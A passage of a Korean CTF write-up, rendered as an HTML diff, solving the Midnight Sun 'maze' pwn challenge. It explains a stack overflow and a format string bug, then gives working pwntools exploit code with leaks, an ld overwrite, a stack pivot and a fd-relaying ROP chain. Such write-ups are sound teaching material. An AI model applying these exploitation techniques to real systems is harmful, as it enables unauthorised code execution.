+ <span class="mo">0012</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000000</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">read</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0014</span>
+ <span class="mo">0013</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0014</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000005</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">fstat</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0016</span>
+ <span class="mo">0015</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0016</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000008</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">lseek</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">001</span><span class="mi">8</span>
+ <span class="mo">0017</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">001</span><span class="mi">8</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000001</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">write</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0020</span>
+ <span class="mo">001</span><span class="mi">9</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0020</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000009</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">mmap</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0022</span>
+ <span class="mo">0021</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0022</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000002</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">open</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0024</span>
+ <span class="mo">0023</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0024</span><span class="o">:</span> <span class="mh">0x15</span> <span class="mh">0x00</span> <span class="mh">0x01</span> <span class="mh">0x00000003</span>  <span class="k">if</span> <span class="p">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">close</span><span class="p">)</span> <span class="k">goto</span> <span class="mo">0026</span>
+ <span class="mo">0025</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x7fff0000</span>  <span class="k">return</span> <span class="n">ALLOW</span>
+ <span class="mo">0026</span><span class="o">:</span> <span class="mh">0x06</span> <span class="mh">0x00</span> <span class="mh">0x00</span> <span class="mh">0x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
+</code></pre></div></div>
+
+<p>16번째 프로세스의 경우 open syscall이 허용되어있는것을 확인할 수 있습니다.</p>
+
+<h2 id="vulnerability">Vulnerability</h2>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">);</span>
+	<span class="n">read</span><span class="p">(</span><span class="n">v15</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x400uLL</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>취약점은 두가지가 있는데, 먼저 첫번째 취약점은 위와 같이 크기가 0x200인 stack buffer에서 발생하는 buffer overflow입니다. 이 입력은 처음 기능을 입력받을때 존재합니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>					<span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"YOU SHOUT INTO THE DARKNESS</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+          <span class="n">v43</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">" </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+          <span class="k">if</span> <span class="p">(</span> <span class="n">v43</span> <span class="p">)</span>
+          <span class="p">{</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="n">v43</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="n">v43</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="n">v43</span><span class="p">);</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="n">v17</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>두번째 취약점은 SHOUT <MESSAGE>에 존재합니다. 입력받은 MESSAGE를 출력할 때 Format String Bug가 존재합니다.</MESSAGE></p>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>exploit을 위해 stack buffer overflow로 rip를 바꾸려면 ESCAPE 기능을 사용해야 합니다. 하지만 return하기 전에 fd를 닫기 때문에 추가적인 입력이 불가능합니다. 이것은 처음에 닫는 fd는 0이지만 이후 소켓통신에서 닫는 fd는 입출력 둘다 가능한 fd를 닫아버리기 때문에 지속적으로 값을 주고받는게 불가능해집니다.</p>
+
+<p>따라서 rip를 바꿀 때 ESCAPE 기능이 아닌 다른 기능으로 rip를 바꿔야 합니다. 저는 format string bug로 ld를 덮어서 exit handler호출 과정에 rip를 변경하는 방법을 사용했습니다. 아마 다른 방법으로 rip를 바꿔도 비슷할 것이라 생각합니다. rip를 바꾼 이후에는 stack pivot을 통해 원하는 rop chain을 실행할 수 있게 합니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>여기서 실행하는 rop chain이 exploit의 핵심입니다. 위 코드를 보시면 아시겠지만 writable한 memory에 0으로 받은 입력을 target fd에 써주고, 그 fd에서 받은 값을 다시 읽어서 1에 써줍니다.</p>
+
+<p>이건 처음에 실행하는 rop chain이라 위 처럼 사용했지만 이후에 양방향 입출력이 가능한 socket fd에서는 0과 1을 그 fd로 대체해주면 됩니다.</p>
+
+<p>이렇게하면 우리의 입출력을 fd 0,1을 이용해 주고받을 수 있습니다. 여기까지 되면 동일한 과정으로 여러개의 프로세스에 값을 전달할 수 있습니다.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">1</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">27</span> <span class="c1">// 27 -&gt; 28</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">5</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">29</span> <span class="c1">// 29 -&gt; 30</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">9</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">31</span> <span class="c1">// 31 -&gt; 32</span>
+<span class="p">.</span><span class="o">/</span><span class="n">maze</span> <span class="mi">13</span> <span class="mi">16</span> <span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">0</span> <span class="c1">// 21 -&gt; 22</span>
+</code></pre></div></div>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0</span> <span class="o">-&gt;</span> <span class="mi">27</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">1</span>
+<span class="mi">0</span> <span class="o">-&gt;</span> <span class="mi">27</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">29</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">1</span>
+<span class="mi">0</span> <span class="o">-&gt;</span> <span class="mi">27</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">29</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">31</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>따라서 위처럼 입출력을 계속 주고받아 16번째 프로세스에 도달할 때 까지 계속 익스를 해주면 됩니다. 다만 fsb 과정에서 발생하는 큰 출력, 그리고 0x100바이트가 넘는 rop chain을 실행하기 위한 큰 입력이 필요해서 중간에 조금씩 sleep이나 입출력을 맞춰주기 위한 작업들이 필요했습니다.</p>
+
+<p>그 과정이 끝나면 flag.txt 를 open해서 read/write 해주면 됩니다.</p>
+
+<h3 id="exploit-code">Exploit Code</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">npwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+    <span class="n">opt</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">.</span><span class="n">pop</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">opt</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-maze-01.play.midnightsunctf.se'</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./maze'</span><span class="p">)</span>
+        <span class="n">g</span> <span class="o">=</span> <span class="n">N</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">opt</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">g</span><span class="p">.</span><span class="n">attach</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">s</span>
+
+<span class="k">def</span> <span class="nf">fsb</span><span class="p">(</span><span class="n">old</span><span class="p">,</span> <span class="n">new</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">old</span> <span class="o">&gt;</span> <span class="n">new</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="n">old</span> <span class="o">+</span> <span class="n">new</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">new</span> <span class="o">-</span> <span class="n">old</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
+<span class="c1">#s = conn()
+</span><span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'pwn-maze-01.play.midnightsunctf.se'</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span>
+<span class="n">sla</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">sendlineafter</span>
+<span class="n">sa</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">sendafter</span>
+
+<span class="n">pivot</span> <span class="o">=</span>  <span class="mh">0x000000000011f12d</span> <span class="c1">#: add rsp, 0x118 ; ret
+</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x270b3</span>
+<span class="n">ld</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">leak</span><span class="p">[</span><span class="mi">3</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">):</span>
+        <span class="n">fd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"ld : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">ld</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">))</span>
+<span class="n">s</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"fd: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">pivot</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'SHOUT '</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">53</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="s">'%{}c%{}$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">fsb</span><span class="p">((</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="n">i</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">,</span> <span class="p">(</span><span class="n">target</span><span class="o">/</span><span class="p">(</span><span class="mh">0x100</span><span class="o">**</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">),</span> <span class="mi">54</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x5f</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'B'</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ld</span> <span class="o">+</span> <span class="mh">0x1948</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'AB'</span><span class="p">)</span>
+
+<span class="n">prbp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x00000000000256c0</span>
+<span class="n">prdi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+<span class="n">prsi</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+<span class="n">prdxp</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x0000000000162866</span>
+<span class="n">lr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x000000000005aa48</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x111130</span>
+<span class="n">write</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1111d0</span>
+<span class="n">writable</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="mh">0x1ee000</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">7</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mh">0x228</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x500</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">writable</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prdxp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x370</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">prbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">-</span> <span class="mh">0x440</span><span class="p">)</span>
+<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">lr</span><span class="p">)</span>
+<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pay</span><span class="p">))</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU FALL THROUGH A TRAP IN THE FLOOR AND DIE'</span><span class="p">)</span>
+
+<span class="c1">#####################################
+############## STAGE 2 ##############
+#####################################
+</span><span class="n">pfd</span> <span class="o">=</span> <span class="n">fd</span> <span class="o">+</span> <span class="mi">1</span>
+
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'HELP'</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'SHOUT %216$p.%217$p.%218$p.%249$s'</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'YOU HEAR AN ECHO</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
